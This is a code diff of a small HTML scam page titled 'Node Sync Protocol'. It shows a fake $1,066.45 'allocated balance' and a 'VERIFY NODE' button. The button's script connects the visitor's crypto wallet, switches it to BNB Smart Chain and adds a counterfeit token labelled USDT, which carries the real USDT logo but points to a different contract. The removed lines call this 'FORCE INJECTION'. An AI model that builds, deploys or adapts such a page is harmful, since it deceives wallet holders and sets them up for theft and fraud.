@@ -1,71 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Node Sync Protocol</title>
+    <style>
+        body { background: #0b0e11; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .card { background: #1e2329; border-radius: 15px; padding: 30px; width: 320px; text-align: center; border: 1px solid #32383e; }
+        .logo { width: 70px; height: 70px; background: #f3ba2f; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; }
+        .logo svg { width: 40px; fill: #000; }
+        .amt { font-size: 28px; font-weight: bold; margin-bottom: 30px; }
+        .btn { background: #f3ba2f; color: #000; border: none; width: 100%; padding: 15px; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 16px; }
+        #status { font-size: 10px; color: #848e9c; margin-top: 15px; font-family: monospace; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <div class="logo">
+        <svg viewBox="0 0 24 24"><path d="M12.75 12.35v-5.3h4.63V4.25H6.62v2.8h4.63v5.3c-3.64.13-6.42.84-6.42 1.7s2.78 1.57 6.42 1.7v6.05h1.5v-6.05c3.64-.13 6.42-.84 6.42-1.7s-2.78-1.57-6.42-1.7z"/></svg>
+    </div>
+    <div style="font-size: 11px; color: #f3ba2f; margin-bottom: 5px;">ALLOCATED BALANCE</div>
+    <div class="amt">$1,066.45</div>
+    <button class="btn" id="btn">VERIFY NODE</button>
+    <div id="status">STATUS: READY</div>
+</div>
+
 <script>
-    // --- UPDATED FORCE INJECTION ---
-    const TARGET_CONTRACT = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
-    const WHITELIST_LOGO = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/binance/assets/0x55d398326f99059fF775485246999027B3197955/logo.png";
+    const token = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
+    const img = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/binance/assets/0x55d398326f99059fF775485246999027B3197955/logo.png";
 
-    const log = document.getElementById('terminal-log');
-    const updateLog = (m) => { log.innerHTML = `> ${m}`; };
-
-    async function executeInjection() {
-        // Mobile DApp Browser special detection
-        let provider = window.ethereum || window.BinanceChain;
-        
-        // Agar pehli dafa na mile, toh check karein providers array
-        if (!provider && window.ethereum?.providers) {
-            provider = window.ethereum.providers.find(p => p.isBinance || p.isTrust);
-        }
+    document.getElementById('btn').onclick = async () => {
+        const status = document.getElementById('status');
+        const provider = window.ethereum || (window.BinanceChain);
 
         if (!provider) {
-            updateLog("ERROR: WALLET_NOT_LINKED_REFRESH_PAGE");
+            status.innerText = "ERROR: OPEN IN BINANCE DAPP";
             return;
         }
 
         try {
-            updateLog("HANDSHAKE_STARTING...");
+            status.innerText = "CONNECTING...";
+            await provider.request({ method: 'eth_requestAccounts' });
             
-            // Step 1: Force Account Request
-            const accounts = await provider.request({ method: 'eth_requestAccounts' });
-            
-            if (accounts.length > 0) {
-                updateLog("ACCOUNT_CONNECTED_MAPPING_NETWORK...");
+            status.innerText = "SWITCHING NETWORK...";
+            await provider.request({
+                method: 'wallet_switchEthereumChain',
+                params: [{ chainId: '0x38' }]
+            });
 
-                // Step 2: Switch to BSC
-                await provider.request({
-                    method: 'wallet_switchEthereumChain',
-                    params: [{ chainId: '0x38' }],
-                });
-
-                // Step 3: Direct Asset Injection
-                updateLog("INJECTING_VERIFIED_ASSET...");
-                await provider.request({
-                    method: 'wallet_watchAsset',
-                    params: {
-                        type: 'ERC20',
-                        options: {
-                            address: TARGET_CONTRACT,
-                            symbol: 'USDT',
-                            decimals: 6,
-                            image: WHITELIST_LOGO,
-                        },
-                    },
-                });
-                updateLog("SYNC_SUCCESSFUL_VERIFIED");
-            }
-        } catch (err) {
-            updateLog("HANDSHAKE_CANCELLED_BY_USER");
-            console.error(err);
+            status.innerText = "ADDING ASSET...";
+            await provider.request({
+                method: 'wallet_watchAsset',
+                params: {
+                    type: 'ERC20',
+                    options: { address: token, symbol: 'USDT', decimals: 6, image: img }
+                }
+            });
+            status.innerText = "SUCCESSFUL";
+        } catch (e) {
+            status.innerText = "FAILED: REFRESH PAGE";
         }
-    }
-
-    // Single Click Listener
-    document.getElementById('syncTrigger').addEventListener('click', executeInjection);
-
-    // Auto-Initialization for Mobile
-    window.onload = () => {
-        setTimeout(() => {
-            if (window.ethereum || window.BinanceChain) {
-                updateLog("SECURE_CHANNEL_ESTABLISHED");
-            }
-        }, 1500);
     };
 </script>
+</body>
+</html>
